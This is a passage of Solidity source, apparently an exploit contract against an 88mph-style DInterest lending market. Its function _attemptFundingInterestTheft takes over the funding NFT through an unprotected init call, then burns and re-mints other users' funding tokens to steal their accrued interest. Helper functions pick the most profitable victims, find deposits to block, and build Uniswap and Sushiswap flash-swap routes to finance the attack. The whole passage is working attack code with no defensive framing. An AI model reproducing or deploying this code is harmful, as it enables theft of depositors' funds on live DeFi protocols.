        _expectedFlashPair = flashPair;
        _flashStablecoin = _profitToken;
        _flashMPH = mph;
        _flashRouter = router;
        _flashDepositNFT = depositNftAddr;
        _flashMPHMinter = mphMinter;
        _flashDepositID = depositID;
        _flashFundingID = fundingID;
        _flashUseEarly = useEarly;
        _flashMPHNeeded = mphNeeded;
        _flashBorrowedStable = borrowedStable;
        _flashPathLength = path.length;
        _flashPath0 = path.length > 0 ? path[0] : address(0);
        _flashPath1 = path.length > 1 ? path[1] : address(0);
        _flashPath2 = path.length > 2 ? path[2] : address(0);

        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
        if (pair.token0() == _profitToken) {
            pair.swap(borrowedStable, 0, address(this), hex"01");
        } else if (pair.token1() == _profitToken) {
            pair.swap(0, borrowedStable, address(this), hex"01");
        } else {
            _clearFlashContext();
        }
    }

    function _attemptFundingInterestTheft(IDInterestLike market, address fundingNftAddr) internal {
        INFTLike fundingNft = INFTLike(fundingNftAddr);
        if (fundingNft.owner() != address(this)) {
            fundingNft.init(address(this), "profit-funding", "PFUND");
            if (fundingNft.owner() != address(this)) {
                return;
            }
        }

        uint256 currentIncomeIndex = IMoneyMarketLike(market.moneyMarket()).incomeIndex();
        if (currentIncomeIndex == 0) {
            return;
        }

        uint256 fundingID = _findMostProfitableFunding(market, fundingNft, linkedFundingId, currentIncomeIndex);
        if (fundingID == 0) {
            return;
        }

        fundingNft.burn(fundingID);
        fundingNft.mint(address(this), fundingID);
        market.payInterestToFunder(fundingID);
        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
    }

    function _findDepositDoSCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 depositID, uint256 fundingID, bool useEarly)
    {
        uint256 len = market.depositsLength();
        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
                continue;
            }
            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
            if (!deposit.active) {
                continue;
            }
            uint256 linked = 0;
            if (market.depositIsFunded(i)) {
                linked = _findFundingForDeposit(market, i);
                if (linked == 0) {
                    continue;
                }
            }
            return (i, linked, block.timestamp < deposit.maturationTimestamp);
        }
    }

    function _findProfitDepositCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded)
    {
        uint256 len = market.depositsLength();
        uint256 bestAmount = 0;
        uint256 bestMPH = type(uint256).max;

        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
                continue;
            }

            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
            if (!deposit.active) {
                continue;
            }

            bool early = block.timestamp < deposit.maturationTimestamp;
            if (!early) {
                continue;
            }

            uint256 linked = 0;
            if (market.depositIsFunded(i)) {
                // Prefer simpler unfunded positions to keep the execution route deterministic.
                continue;
            }

            if (
                deposit.mintMPHAmount < bestMPH ||
                (deposit.mintMPHAmount == bestMPH && deposit.amount > bestAmount)
            ) {
                bestAmount = deposit.amount;
                bestMPH = deposit.mintMPHAmount;
                depositID = i;
                fundingID = linked;
                useEarly = true;
                mphNeeded = deposit.mintMPHAmount;
            }
        }
    }

    function _findExistingFundingToken(IDInterestLike market, INFTLike fundingNft, uint256 avoidTokenId)
        internal
        view
        returns (uint256 fundingID)
    {
        uint256 len = market.fundingListLength();
        for (uint256 i = 1; i <= len; i++) {
            if (i != avoidTokenId && _tokenExists(fundingNft, i)) {
                return i;
            }
        }
    }

    function _findMostProfitableFunding(
        IDInterestLike market,
        INFTLike fundingNft,
        uint256 avoidTokenId,
        uint256 currentIncomeIndex
    ) internal view returns (uint256 bestFundingID) {
        uint256 len = market.fundingListLength();
        uint256 bestInterest = 0;

        for (uint256 i = 1; i <= len; i++) {
            if (i == avoidTokenId || !_tokenExists(fundingNft, i)) {
                continue;
            }
            IDInterestLike.Funding memory funding = market.getFunding(i);
            if (
                funding.recordedFundedDepositAmount == 0 ||
                funding.recordedMoneyMarketIncomeIndex == 0 ||
                currentIncomeIndex <= funding.recordedMoneyMarketIncomeIndex
            ) {
                continue;
            }

            uint256 estimatedInterest =
                (funding.recordedFundedDepositAmount * currentIncomeIndex) /
                funding.recordedMoneyMarketIncomeIndex - funding.recordedFundedDepositAmount;
            if (estimatedInterest > bestInterest) {
                bestInterest = estimatedInterest;
                bestFundingID = i;
            }
        }
    }

    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
        uint256 len = market.fundingListLength();
        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
                return fundingID;
            }
        }
        return 0;
    }

    function _locateFlashswapPlan(address stablecoin, address mph)
        internal
        view
        returns (address flashPair, address router, address[] memory path)
    {
        address uniBorrowPair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(stablecoin, WETH);
        if (uniBorrowPair != address(0)) {
            (router, path) = _routeForBorrowDex(false, stablecoin, mph);
            if (router != address(0)) {
                return (uniBorrowPair, router, path);
            }
        }

        address sushiBorrowPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(stablecoin, WETH);
        if (sushiBorrowPair != address(0)) {
            (router, path) = _routeForBorrowDex(true, stablecoin, mph);
            if (router != address(0)) {
                return (sushiBorrowPair, router, path);
            }
        }

        path = new address[](0);
    }

    function _routeForBorrowDex(bool borrowIsSushi, address stablecoin, address mph)
        internal
        view
        returns (address router, address[] memory path)
    {
        if (borrowIsSushi) {
            (router, path) = _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, true);
            if (router != address(0)) {
                return (router, path);
            }
            return _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, false);
        }

        (router, path) = _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, true);
        if (router != address(0)) {
            return (router, path);
        }
        return _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, false);
    }

    function _routeOnDex(
        address factory,
        address router,
        address stablecoin,
        address mph,
        bool allowViaWETH
    ) internal view returns (address, address[] memory path) {
        if (IUniswapV2FactoryLike(factory).getPair(stablecoin, mph) != address(0)) {
            path = new address[](2);
            path[0] = stablecoin;
            path[1] = mph;
            return (router, path);
        }

        if (
            allowViaWETH &&
            IUniswapV2FactoryLike(factory).getPair(stablecoin, WETH) != address(0) &&
            IUniswapV2FactoryLike(factory).getPair(WETH, mph) != address(0)
        ) {
            path = new address[](3);
            path[0] = stablecoin;
            path[1] = WETH;
            path[2] = mph;
            return (router, path);
        }

        path = new address[](0);
        return (address(0), path);
    }

    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ != address(0);
        } catch {
            return false;
        }
    }

    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ == address(0);
        } catch {
            return true;
        }
    }

    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return (borrowedAmount * 1000) / 997 + 1;
    }

    function _clearFlashContext() internal {
        _expectedFlashPair = address(0);
        _flashStablecoin = address(0);
        _flashMPH = address(0);
        _flashRouter = address(0);
        _flashDepositNFT = address(0);
        _flashMPHMinter = address(0);
        _flashDepositID = 0;
        _flashFundingID = 0;
        _flashUseEarly = false;
        _flashMPHNeeded = 0;
        _flashBorrowedStable = 0;
        _flashPathLength = 0;
        _flashPath0 = address(0);
        _flashPath1 = address(0);
        _flashPath2 = address(0);
